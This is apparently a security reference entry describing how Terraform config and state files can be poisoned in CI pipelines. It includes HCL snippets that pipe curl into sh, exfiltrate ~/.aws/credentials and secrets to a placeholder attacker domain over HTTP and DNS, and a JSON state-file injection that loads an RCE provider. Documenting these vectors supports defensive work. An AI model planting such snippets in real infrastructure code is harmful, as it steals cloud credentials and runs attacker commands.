---
title: terraform
tags:
  - cli
  - input-file
  - eval-sh
references:
- https://registry.terraform.io/providers/hashicorp/external/latest/docs/data-sources/external
- https://developer.hashicorp.com/terraform/language/resources/provisioners/local-exec
- https://developer.hashicorp.com/terraform/language/resources/provisioners/remote-exec
- https://registry.terraform.io/providers/hashicorp/http/latest/docs/data-sources/http
- https://registry.terraform.io/providers/hashicorp/dns/latest/docs
- https://registry.terraform.io/providers/offensive-actions/statefile-rce/latest
---

Most CI environments run `terraform init` before planning to ensure providers and modules are downloaded. This means that new changes that bring new providers, such as one or more external providers used to execute commands, Terraform will install any new providers even though they are not part of the lockfile. By default, the lockfile will be modified and Terraform informs the user to commit its result.

*Normally*, during the following `terraform plan` phase, no resources are being deployed. This should only happen during the `terraform apply` phase.

## Poisoning of config files

As a prerequisite for these vectors, an attacker needs to have write access to the config files written in HCL (HashiCorp Language). Furthermore, some event needs to trigger the execution of terraform in a pipeline.

### RCE using the "external" data source

This will execute in both the `terraform plan` and `terraform apply` phase on every terraform run.

The `hashicorp/external` provider has a data resource that allows executing commands and make the output available to Terraform. The command must output valid JSON on stdout. The following definition is enough to trigger the RCE, the provider does not need to be directly declared.
```terraform
data "external" "cmd" {
  program = ["sh", "-c", "curl ... | sh >&2; echo {}"]
}
```

This was described by Alex Kaskasoli in 2021: https://alex.kaskaso.li/post/terraform-plan-rce

### RCE using the "local-exec" and "remote-exec" provisioners

This will only execute once after the creation of the resource in the `terraform apply` phase. It will only execute on later terraform runs, if the resource got deleted from the state file in the meantime.

Provisioners are meant to run bootstrapping commands after the resource they are embedded in has been created. This might be any resource, not just the `null_resource` used in the examples.

The `local-exec` provisioner can be used to run commands on the machine that executes terraform. It also allows for choosing of the binary to use with the `interpreter` argument, if needed.
```terraform
resource "null_resource" "cmd" {
  provisioner "local-exec" {
    command = "<arbitrary_shell_command_goes_here>"
  }
}
```

The `remote-exec` provisioner allows to to execute commands on a remote machine, using `ssh` or `winrm`, for which valid credentials are needed. This might allow to pivot into internal networks.
```terraform
resource "null_resource" "cmd" {
  connection {
    type     = "ssh"
    user     = "root"
    password = var.root_password
    host     = self.public_ip
  }
  provisioner "remote-exec" {
    inline = [
      "<arbitrary_shell_command_goes_here>"
    ]
  }
}
```

### Data leakage using the "http" data source

This will execute in both the `terraform plan` and `terraform apply` phase.

The `http` data source makes an HTTP GET request to the given URL and exports information about the response. We can use interpolation to extract interesting values of other objects or base64 encoded files.
```terraform
data "http" "file" {
    url = "https://<attacker_domain>?exfil=${filebase64("~/.aws/credentials")}"
}

data "http" "secret" {
    url = "https://<attacker_domain>?exfil=${aws_secretsmanager_secret_version.password.secret_string}"
}
```

This was described by xssfox in 2022: https://sprocketfox.io/xssfox/2022/02/09/terraformsupply/

### Data leakage using the data sources of the "dns" provider

This will execute in both the `terraform plan` and `terraform apply` phase.

In a very similar fashion to the `http` data source, we can send DNS requests for an attacker controlled domain and embed the values to exfiltrate in a subdomain.
```terraform
data "dns_a_record_set" "file" {
    host = "${filebase64("~/.aws/credentials")}.<attacker_domain>" 
}

data "dns_a_record_set" "secret" {
    host = "${aws_secretsmanager_secret_version.password.secret_string}.<attacker_domain>" 
}
```

This was described by Shelly Raban in 2024: https://www.tenable.com/blog/the-dark-side-of-domain-specific-languages-uncovering-new-attack-techniques-in-opa-and

## Poisoning of state files

As a prerequisite for this vector, an attacker needs to have write access to the state file. These files are traditionally stored in bucket solutions like AWS S3 or Azure Blob Storage Accounts. Oftentimes, all developers have this required write access for all buckets in the account / subscription. Furthermore, some event needs to trigger the execution of terraform in a pipeline.

### RCE using the "offensive-actions/statefile-rce" provider or a custom provider

This will execute in both the `terraform plan` and `terraform apply` phase.

If an attacker injects a fake resource referencing an arbitrary provider into the `resources` array in a state file, the next time a pipeline runs referencing that state file, terraform will download the newly referenced provider during the `terraform init` phase. This happens, because terraform wants to use the provider to destroy the injected resource.

An attacker could create their own malicious provider, or they use the community provider `offensive-actions/statefile-rce`. This provider allows to define a command that will be run during both `terraform plan` and `terraform apply` dynamically in the state file. The following snippet has to be added to the state file in the `resources` array:
```json
{
  "mode": "managed",
  "type": "rce",
  "name": "<arbitrary_name>",
  "provider": "provider[\"registry.terraform.io/offensive-actions/statefile-rce\"]",
  "instances": [
    {
      "schema_version": 0,
      "attributes": {
        "command": "<arbitrary_command>",
        "id": "rce"
      },
      "sensitive_attributes": [],
      "private": "bnVsbA=="
    }
  ]
}
```

This vector was first described by Daniel Grzelak in 2024 (https://www.plerion.com/blog/hacking-terraform-state-for-privilege-escalation) and weaponized in the `offensive-actions/statefile-rce` provider by Benedikt Haußner in the same year (https://github.com/offensive-actions/terraform-provider-statefile-rce).
